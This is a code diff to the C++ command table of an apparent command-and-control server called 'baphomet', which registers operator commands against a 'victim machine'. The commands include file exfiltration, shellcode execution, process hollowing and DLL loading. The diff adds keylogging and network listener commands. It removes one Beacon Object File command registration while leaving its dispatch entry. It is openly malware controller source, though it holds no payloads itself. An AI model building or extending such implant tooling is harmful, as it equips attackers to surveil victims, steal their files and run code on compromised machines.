@@ -32,6 +32,7 @@ lurch::baphomet::init_commands() {
         commands.add_command("checkin", "Used by the agent to indicate it has connected.");
         commands.add_command("help", "display this help message and exit.");
         commands.add_command("getinfo", "retrieves basic info about the victim machine.");
+        commands.add_command("listeners", "displays existing listeners for this object.");
 
         commands.add_command("cd", "changes the working directory")
             .arg<std::string>("--directory", "-d", true);
@@ -58,6 +59,11 @@ lurch::baphomet::init_commands() {
         commands.add_command("exfil", "exfiltrates a file")
             .arg<std::string>("--directory-entry", "-de", true);
 
+        commands.add_command("keylog", "starts or stops keylogging. Only works with no sleepmask.")
+            .arg<empty>("--start", "-st", false)
+            .arg<empty>("--stop", "-sp", false)
+            .arg<empty>("--get", "-g", false);
+
         commands.add_command("runexe", "runs a staged executable file on the victim machine")
             .arg<std::string>("--staged-file", "-sf", true)
             .arg<empty>("--hollow", "-h", false)
@@ -70,9 +76,6 @@ lurch::baphomet::init_commands() {
             .arg<std::string>("--staged-file", "-sf", true)
             .arg<std::string>("--arguments", "-a", false);
 
-        commands.add_command("runbof", "runs a Beacon Object File on the victim machine") // TODO: no bof arguments yet :(
-            .arg<std::string>("--staged-file", "-sf", true);
-
         commands.add_command("runshellcode", "loads shellcode into memory and executes it")
             .arg<std::string>("--staged-file", "-sf", true)
             .arg<empty>("--child", "-c", false)
@@ -81,6 +84,11 @@ lurch::baphomet::init_commands() {
 
         commands.add_command("complete_task", "used by the agent to complete a task.")
             .arg<std::string>("--result", "-r", true);
+
+        commands.add_command("start_listener", "start a listener on a specified address or port")
+            .arg<std::string>("--type", "-t", true)
+            .arg<std::string>("--address", "-a", true)
+            .arg<int64_t>("--port", "-p", true);
 
         commands.done();
 
@@ -91,6 +99,7 @@ lurch::baphomet::init_commands() {
         callables =
         {
             {"checkin",       &baphomet::checkin},
+            {"start_listener",&baphomet::start_listener},
             {"indicate_exit", &baphomet::indicate_exit},
             {"cat",         &baphomet::cat},
             {"cd",          &baphomet::cd},
@@ -100,6 +109,7 @@ lurch::baphomet::init_commands() {
             {"ps",          &baphomet::ps},
             {"cmd",         &baphomet::cmd},
             {"exfil",       &baphomet::exfil},
+            {"keylog",       &baphomet::keylog},
             {"runbof",      &baphomet::runbof},
             {"runexe",      &baphomet::runexe},
             {"rundll",      &baphomet::rundll},
@@ -107,9 +117,11 @@ lurch::baphomet::init_commands() {
             {"complete_task", &baphomet::complete_task},
             {"get_task",      &baphomet::get_task},
             {"tasks",       [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_tasks(); }},
+            {"listeners",   [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_listeners(); }},
             {"staged",      [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_staged_files(); }},
             {"clear_tasks", [](baphomet*  ptr, reciever_context& ctx) { return ptr->clear_tasks(); }},
             {"help",        [&](baphomet* ptr, reciever_context& ctx) { return baphomet::commands.help(); }}
         };
     }
 }
+
